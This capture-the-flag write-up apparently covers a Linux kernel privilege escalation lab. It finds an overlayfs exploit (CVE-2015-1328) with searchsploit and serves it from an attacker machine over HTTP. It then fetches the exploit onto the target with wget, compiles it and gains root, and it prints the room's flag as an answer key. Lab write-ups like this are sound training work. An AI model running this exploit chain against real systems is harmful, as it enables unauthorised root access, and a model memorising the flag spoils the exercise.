Privilege escalation aims to gain root access by exploiting vulnerabilities or misconfigurations. 
On Linux, kernel exploits are a common method, involving:
1. Identifying the kernel version (uname -r).
2. Searching for exploits via Google, Exploit-DB, or Linux Exploit Suggester (LES).
3. Transferring the exploit to the target machine (e.g., using Python’s SimpleHTTPServer and wget).
4. Running the exploit, ensuring it is understood beforehand to avoid system instability.

Kernel exploits can crash systems, so they should only be used within the allowed scope. 
Some require further interaction, so reading instructions carefully is crucial.

### Q.1: find and use the appropriate kernel exploit to gain root privileges on the target system. 
### Answer: No answer needed

### Q.2: What is the content of the flag1.txt file?

There are a lot of different ways to exploit this kernel exploit. Let's go through the steps of the Kernel exploit Methodology.
1. Identify the kernel version.
```
$ uname -a
Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```
2. Search and find an exploit code for the kernel version of the target system.
This we can find with some quick Googling. Download the exploit and move it into your /tmp folder. https://www.exploit-db.com/exploits/37292 

In our machine run this command: ```searchsploit linux kernel 3.13```. Then found some exploit that Privilage Escalation

```
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation                        | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access /etc/shadow)   | linux/local/37293.txt
Linux Kernel 3.13.1 - 'Recvmmsg' Local Privilege Escalation (Metasploit)                                                    | linux/local/40503.rb
Linux Kernel 3.14-rc1 < 3.15-rc4 (x64) - Raw Mode PTY Echo Race Condition Privilege Escalation                              | linux_x86-64/local/33516.c
Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.04/13.10 x64) - 'CONFIG_X86_X32=y' Local Privilege Escalation (3)                      | linux_x86-64/local/31347.c
Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.10) - 'CONFIG_X86_X32' Arbitrary Write (2)                                             | linux/local/31346.c
Linux Kernel 3.4 < 3.13.2 - recvmmsg x32 compat (PoC)                                                                       | linux/dos/31305.c
```
Then download the exploit using this command: ```searchsploit -m linux/local/37292.c```
```
Exploit: Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/37292
     Path: /usr/share/exploitdb/exploits/linux/local/37292.c
    Codes: CVE-2015-1328
 Verified: True
File Type: C source, ASCII text, with very long lines (466)
Copied to: /home/kali/37292.c
```
Then ```ls``` to see has it downloaded or not then and move it into your **/tmp** folder using: ```sudo mv /home/deadalien/37292.c ~/tmp```

On your local machine, we need to start up a python server so that we can send our downloaded exploit to our target machine in Attackbox. We can do this by: 
```python3 -m http.server 8000```
This starts a simple web server on port 8000.

Open up a new tab/terminal so that we can get the IP address of our local machine. We need this to connect to our target machine. Use the ifconfig command and scroll down.
```
tun0: inet <attacker ip>
```  
Now we need to download the file from your attacker machine. It is important to run these commands from the target machine. Before you fetch the file it is important to be in the /tmp directory so that you have permissions to “write” files.
```
$ cd /tmp
$ wget <attacker ip>:8000/37292.c
--2025-08-06 12:52:39--  http://10.17.11.98:8000/37292.c
Connecting to <attacker ip>:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4968 (4.9K) [text/x-csrc]
Saving to: ‘37292.c’

100%[===============================================================================================================================>] 4,968       --.-K/s   in 0s      

2025-08-06 12:52:40 (798 MB/s) - ‘37292.c’ saved [4968/4968]
```
We got the file!

Compiling the .c code to a executable.

Now we just following the exploit instructions. Compile the .c file and run it:
```gcc 37292.c -o exploit```
Running the executable and Shows the result
```
$ ./exploit
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
```
That worked. And we got root! 
```
# id
uid=0(root) gid=0(root) groups=0(root),1001(karen)
```
Now we need to find the flag with a quick find command:
```
#find / -name flag1.txt 2>/dev/null
/home/matt/flag1.txt
```
Now we can simply read the flag, which is at /home/matt/flag1.txt.
```
# cat /home/matt/flag1.txt
THM-28392872729920
```

### Answer: THM-28392872729920
